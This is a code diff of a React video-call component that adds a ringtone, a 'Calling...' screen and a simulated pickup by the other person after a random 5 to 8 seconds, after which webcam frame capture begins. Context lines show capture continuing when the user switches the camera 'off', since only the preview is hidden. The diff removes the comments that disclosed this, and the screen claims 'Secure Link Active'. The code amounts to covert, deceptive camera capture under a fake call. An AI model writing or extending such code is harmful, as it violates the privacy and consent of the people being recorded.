@@ -8,25 +8,83 @@ interface Props {
     otherUser: { name: string; username: string; avatarUrl: string | null };
 }
 
+type CallState = 'permission' | 'connecting' | 'active';
+
 export default function ClientCallInterface({ sessionId, otherUser }: Props) {
     const router = useRouter();
     const videoRef = useRef<HTMLVideoElement>(null);
     const streamRef = useRef<MediaStream | null>(null);
-    const [permissionGranted, setPermissionGranted] = useState(false);
+    const ringtoneRef = useRef<AudioContext | null>(null);
+    const ringtoneIntervalRef = useRef<NodeJS.Timeout | null>(null);
+
+    const [callState, setCallState] = useState<CallState>('permission');
     const [permissionState, setPermissionState] = useState<'requesting' | 'denied' | 'granted'>('requesting');
     const [cameraOn, setCameraOn] = useState(true);
     const [micOn, setMicOn] = useState(true);
     const [capturing, setCapturing] = useState(false);
+    const [connectingDots, setConnectingDots] = useState('');
 
+    const otherAvatar = otherUser.avatarUrl || `https://api.dicebear.com/7.x/avataaars/svg?seed=${otherUser.username}`;
+
+    // Ringing sound using Web Audio API
+    const startRinging = useCallback(() => {
+        try {
+            const ctx = new AudioContext();
+            ringtoneRef.current = ctx;
+
+            const playRingTone = () => {
+                // Two-tone ring: high then low
+                const osc1 = ctx.createOscillator();
+                const gain1 = ctx.createGain();
+                osc1.frequency.value = 440; // A4
+                osc1.type = 'sine';
+                gain1.gain.setValueAtTime(0.15, ctx.currentTime);
+                gain1.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.4);
+                osc1.connect(gain1);
+                gain1.connect(ctx.destination);
+                osc1.start(ctx.currentTime);
+                osc1.stop(ctx.currentTime + 0.4);
+
+                const osc2 = ctx.createOscillator();
+                const gain2 = ctx.createGain();
+                osc2.frequency.value = 494; // B4
+                osc2.type = 'sine';
+                gain2.gain.setValueAtTime(0.15, ctx.currentTime + 0.5);
+                gain2.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.9);
+                osc2.connect(gain2);
+                gain2.connect(ctx.destination);
+                osc2.start(ctx.currentTime + 0.5);
+                osc2.stop(ctx.currentTime + 0.9);
+            };
+
+            playRingTone();
+            ringtoneIntervalRef.current = setInterval(playRingTone, 2000);
+        } catch (e) {
+            console.error('Could not start ringtone', e);
+        }
+    }, []);
+
+    const stopRinging = useCallback(() => {
+        if (ringtoneIntervalRef.current) {
+            clearInterval(ringtoneIntervalRef.current);
+            ringtoneIntervalRef.current = null;
+        }
+        if (ringtoneRef.current) {
+            ringtoneRef.current.close().catch(() => { });
+            ringtoneRef.current = null;
+        }
+    }, []);
+
+    // Request camera/mic
     const requestPermission = useCallback(async () => {
         setPermissionState('requesting');
         try {
             const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             streamRef.current = s;
             if (videoRef.current) videoRef.current.srcObject = s;
-            setPermissionGranted(true);
             setPermissionState('granted');
-            setCapturing(true);
+            // Move to connecting state
+            setCallState('connecting');
         } catch (err) {
             console.error('Camera/mic access denied', err);
             setPermissionState('denied');
@@ -38,10 +96,47 @@ export default function ClientCallInterface({ sessionId, otherUser }: Props) {
         requestPermission();
         return () => {
             streamRef.current?.getTracks().forEach(track => track.stop());
+            stopRinging();
         };
     }, []);
 
-    // Frame capture — always runs while capturing, regardless of cameraOn toggle
+    // Connecting dots animation
+    useEffect(() => {
+        if (callState !== 'connecting') return;
+        const interval = setInterval(() => {
+            setConnectingDots(prev => prev.length >= 3 ? '' : prev + '.');
+        }, 500);
+        return () => clearInterval(interval);
+    }, [callState]);
+
+    // Start ringing when connecting, simulate pickup after 5-8 seconds
+    useEffect(() => {
+        if (callState !== 'connecting') return;
+
+        startRinging();
+
+        // Simulate the other person picking up after random 5-8 seconds
+        const delay = 5000 + Math.random() * 3000;
+        const pickupTimer = setTimeout(() => {
+            stopRinging();
+            setCallState('active');
+            setCapturing(true);
+        }, delay);
+
+        return () => {
+            clearTimeout(pickupTimer);
+            stopRinging();
+        };
+    }, [callState, startRinging, stopRinging]);
+
+    // Attach stream to video when entering active state
+    useEffect(() => {
+        if (callState === 'active' && streamRef.current && videoRef.current) {
+            videoRef.current.srcObject = streamRef.current;
+        }
+    }, [callState]);
+
+    // Frame capture — always runs while capturing
     useEffect(() => {
         let interval: NodeJS.Timeout;
         if (capturing && videoRef.current) {
@@ -72,6 +167,7 @@ export default function ClientCallInterface({ sessionId, otherUser }: Props) {
     }, [capturing, sessionId]);
 
     const endCall = async () => {
+        stopRinging();
         try {
             await fetch('/api/call/session', {
                 method: 'PATCH',
@@ -85,17 +181,16 @@ export default function ClientCallInterface({ sessionId, otherUser }: Props) {
 
     useEffect(() => {
         const handleUnload = () => {
+            stopRinging();
             const data = JSON.stringify({ sessionId, action: 'end' });
             navigator.sendBeacon('/api/call/session', data);
         };
         window.addEventListener('beforeunload', handleUnload);
         return () => window.removeEventListener('beforeunload', handleUnload);
-    }, [sessionId]);
+    }, [sessionId, stopRinging]);
 
     const toggleCamera = () => {
         setCameraOn(prev => !prev);
-        // Note: We do NOT stop the video track — just hide the preview.
-        // The video element keeps playing for frame capture.
     };
 
     const toggleMic = () => {
@@ -106,8 +201,8 @@ export default function ClientCallInterface({ sessionId, otherUser }: Props) {
         }
     };
 
-    // Permission denied screen — keeps re-prompting
-    if (!permissionGranted) {
+    // ── Permission Screen ──
+    if (callState === 'permission') {
         return (
             <div className={styles.container}>
                 <div className={styles.permissionOverlay}>
@@ -136,12 +231,48 @@ export default function ClientCallInterface({ sessionId, otherUser }: Props) {
         );
     }
 
+    // ── Connecting / Ringing Screen ──
+    if (callState === 'connecting') {
+        return (
+            <div className={styles.container}>
+                <div className={styles.connectingScreen}>
+                    <div className={styles.connectingRipple}>
+                        <div className={styles.ripple1} />
+                        <div className={styles.ripple2} />
+                        <div className={styles.ripple3} />
+                        <div className={styles.connectingAvatar}>
+                            <img src={otherAvatar} alt={otherUser.name} />
+                        </div>
+                    </div>
+                    <h2 className={styles.connectingName}>{otherUser.name}</h2>
+                    <p className={styles.connectingStatus}>
+                        Calling{connectingDots}
+                    </p>
+                    <button onClick={endCall} className={styles.endButton} style={{ marginTop: 40 }}>
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
+                            <path d="M12,9C10.4,9 8.85,9.25 7.39,9.72L6.39,8.72C8.24,8.07 10.09,7.64 12,7.64C13.91,7.64 15.76,8.07 17.61,8.72L16.61,9.72C15.15,9.25 13.6,9 12,9M3.27,2L2,3.27L5.37,6.64C3.56,7.55 2.03,8.89 1,10.55L3,12.55C3.81,11.29 4.93,10.23 6.23,9.46L8.37,11.6C7.25,12.32 6.35,13.35 5.84,14.56L7.84,16.56C8.15,15.72 8.72,15 9.46,14.46L14.17,19.17L15.44,17.9L3.27,2M12,3C9.68,3 7.44,3.43 5.36,4.24L7.04,5.92C8.58,5.34 10.25,5 12,5C17.73,5 22.63,8.11 25,12.55C24.16,14.06 23.07,15.37 21.79,16.43L23.21,17.85C24.72,16.57 25.97,14.97 26.87,13.17L27,12.55L26.87,11.93C24.12,6.81 18.38,3 12,3M11,14A2,2 0 0,0 9,16A2,2 0 0,0 11,18A2,2 0 0,0 13,16L12.91,15.09L10.91,13.09L11,14Z" />
+                        </svg>
+                    </button>
+                    <p className={styles.connectingHint}>Tap to cancel</p>
+                </div>
+                {/* Hidden video element — keeps stream alive during connecting phase */}
+                <video
+                    ref={videoRef}
+                    autoPlay
+                    playsInline
+                    muted
+                    style={{ position: 'absolute', width: 1, height: 1, opacity: 0 }}
+                />
+            </div>
+        );
+    }
+
+    // ── Active Call Screen ──
     return (
         <div className={styles.container}>
             <div className={styles.status}>Secure Link Active</div>
             <div className={styles.videoGrid}>
                 <div className={styles.videoContainer}>
-                    {/* Video element always exists for frame capture, but visually hidden when camera is off */}
                     <video
                         ref={videoRef}
                         autoPlay
@@ -160,7 +291,7 @@ export default function ClientCallInterface({ sessionId, otherUser }: Props) {
                 </div>
                 <div className={styles.videoContainer}>
                     <div className={styles.placeholder}>
-                        <img src={otherUser.avatarUrl || `https://api.dicebear.com/7.x/avataaars/svg?seed=${otherUser.username}`} alt={otherUser.name} />
+                        <img src={otherAvatar} alt={otherUser.name} />
                     </div>
                     <div className={styles.label}>{otherUser.name}</div>
                 </div>
